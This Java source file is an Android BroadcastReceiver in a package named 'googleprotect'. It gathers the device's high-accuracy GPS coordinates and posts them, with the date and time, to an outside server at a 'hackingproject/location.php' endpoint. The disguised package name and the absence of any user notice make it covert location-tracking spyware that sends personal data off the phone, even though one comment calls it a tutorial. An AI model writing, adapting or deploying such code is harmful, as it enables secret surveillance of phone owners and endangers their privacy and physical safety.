package com.baba.googleprotect;

import android.Manifest;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.location.Address;
import android.location.Geocoder;
import android.location.Location;
import android.os.Looper;
import android.util.Log;
import android.widget.Toast;

import androidx.core.app.ActivityCompat;

import com.android.volley.AuthFailureError;
import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;
import com.google.android.gms.location.FusedLocationProviderClient;
import com.google.android.gms.location.LocationCallback;
import com.google.android.gms.location.LocationRequest;
import com.google.android.gms.location.LocationResult;
import com.google.android.gms.location.LocationServices;

import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.TimeZone;

import static android.content.Context.MODE_PRIVATE;

public class TrackReciever extends BroadcastReceiver {

    RequestQueue queue;
    Context mcontext;

    public SharedPreferences sp;
    private String employeeId,time="",date="";
    FusedLocationProviderClient fusedLocationProviderClient;
    LocationRequest locationRequest;
    LocationCallback locationCallback;
    String lat, lang;
    Geocoder geocoder;
    List<Address> addresses;
    Location loc;
    @Override
    public void onReceive(Context context, Intent intent) {
        // Instantiate the RequestQueue.
        queue = Volley.newRequestQueue(context);
            Log.i("tracing","done");
        // TODO: This method is called when the BroadcastReceiver is receiving
     //   Toast.makeText(getmcontext,"hello",Toast.LENGTH_LONG).show();
        buildLocationRequest();
        buildLocationCallback();

        fusedLocationProviderClient = LocationServices.getFusedLocationProviderClient(context);


      // here we are getting current date and time

        Calendar cal = Calendar.getInstance(TimeZone.getDefault());
        SimpleDateFormat sdf = new SimpleDateFormat("HH:mm:ss a", Locale.getDefault());

         time=sdf.format(cal.getTime());
        date = new SimpleDateFormat("yyyy-MM-dd", Locale.getDefault()).format(new Date());

        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(context, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            // TODO: Consider calling
            //    ActivityCompat#requestPermissions
            // here to request the missing permissions, and then overriding
            //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
            //                                          int[] grantResults)
            // to handle the case where the user grants the permission. See the documentation
            // for ActivityCompat#requestPermissions for more details.
            return;
        }
        fusedLocationProviderClient.requestLocationUpdates(locationRequest, locationCallback, Looper.myLooper());
    }

    private void buildLocationCallback() {
        locationCallback=new LocationCallback()
        {
            @Override
            public void onLocationResult(LocationResult locationResult) {

                lat= String.valueOf(locationResult.getLastLocation().getLatitude());
                lang= String.valueOf(locationResult.getLastLocation().getLongitude());
                Log.i("lat",lat);
                Log.i("lang",lang);
                jsonparse();
            }
        };
    }

    private void buildLocationRequest() {
        locationRequest=new LocationRequest();
        locationRequest.setPriority(LocationRequest.PRIORITY_HIGH_ACCURACY);
      //  locationRequest.setInterval(5000);
       // locationRequest.setFastestInterval(3000);
        locationRequest.setSmallestDisplacement(0);
    }

    private void jsonparse() {

        //this is the url where you want to send the request
        //TODO: replace with your own url to send request, as I am using my own localhost for this tutorial
        String url = "https://www.play4deal.com/hackingproject/location.php";

        // Request a string response from the provided URL.
        StringRequest stringRequest = new StringRequest(Request.Method.POST, url,
                new Response.Listener<String>() {
                    @Override
                    public void onResponse(String response) {
                        // Display the response string.
                        //_response.setText(response);
                        Log.i("response",response);
//                        Toast.makeText(mcontext,response,Toast.LENGTH_LONG).show();
                    }
                }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError error) {
                // _response.setText("That didn't work!");
            }
        }) {
            //adding parameters to the request
            @Override
            protected Map<String, String> getParams() throws AuthFailureError {
                Map<String, String> params = new HashMap<>();

                params.put("latitude", lat);
                params.put("longitude", lang);
                params.put("date",date);
                params.put("time",time);
                return params;
            }
        };
        // Add the request to the RequestQueue.
        queue.add(stringRequest);
    }



}
